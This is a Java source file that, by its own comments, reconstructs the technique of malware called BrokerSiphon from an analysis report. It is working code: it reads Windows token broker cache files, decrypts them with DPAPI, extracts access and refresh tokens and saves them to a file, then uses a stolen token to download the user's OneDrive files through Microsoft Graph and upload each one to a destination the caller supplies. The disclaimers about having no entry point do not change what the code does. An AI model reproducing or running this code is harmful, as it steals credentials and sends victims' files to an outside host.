import java.nio.file.*;
import java.nio.charset.StandardCharsets;
import java.net.URI;
import java.net.http.*;
import java.util.*;
import com.google.gson.*;
import com.sun.jna.platform.win32.Crypt32Util;

// Technique reconstruction from TENEX Figure 14 and token/cloud sections.
// Not recovered BrokerSiphon source. No entry point; never executed in testing.
class BrokerReconstruction {
  static final HttpClient client = HttpClient.newHttpClient();
  static void collect(Path tokenBrokerDir, URI destination, String destinationToken) throws Exception {
    try (var entries = Files.walk(tokenBrokerDir)) {
      for (Path entry : entries.filter(p -> p.toString().endsWith(".tbres") || p.toString().endsWith(".tkn")).toList()) {
        JsonObject root = JsonParser.parseString(Files.readString(entry)).getAsJsonObject();
        JsonObject props = root.getAsJsonObject("TBDataStoreObject")
          .getAsJsonObject("ObjectData").getAsJsonObject("SystemDefinedProperties");
        JsonObject response = props.getAsJsonObject("ResponseBytes");
        byte[] payload = Base64.getDecoder().decode(response.get("Value").getAsString());
        if (response.get("IsProtected").getAsBoolean()) {
          payload = Crypt32Util.cryptUnprotectData(payload, 1);
        }
        JsonObject tokens = JsonParser.parseString(new String(payload, StandardCharsets.UTF_8)).getAsJsonObject();
        String access = tokens.get("WTRes_Token").getAsString();
        String refresh = tokens.get("WTRes_RefreshToken").getAsString();
        Files.writeString(Path.of("tokens.txt"), access + "\n" + refresh + "\n", StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        HttpRequest read = HttpRequest.newBuilder(URI.create("https://graph.microsoft.com/v1.0/me/drive/root/children"))
          .header("Authorization", "Bearer " + access).GET().build();
        String listing = client.send(read, HttpResponse.BodyHandlers.ofString()).body();
        for (JsonElement child : JsonParser.parseString(listing).getAsJsonObject().getAsJsonArray("value")) {
          String id = child.getAsJsonObject().get("id").getAsString();
          HttpRequest download = HttpRequest.newBuilder(URI.create("https://graph.microsoft.com/v1.0/me/drive/items/" + id + "/content"))
            .header("Authorization", "Bearer " + access).GET().build();
          byte[] content = client.send(download, HttpResponse.BodyHandlers.ofByteArray()).body();
          HttpRequest upload = HttpRequest.newBuilder(destination)
            .header("Authorization", "Bearer " + destinationToken)
            .PUT(HttpRequest.BodyPublishers.ofByteArray(content)).build();
          client.send(upload, HttpResponse.BodyHandlers.discarding());
        }
      }
    }
  }
}
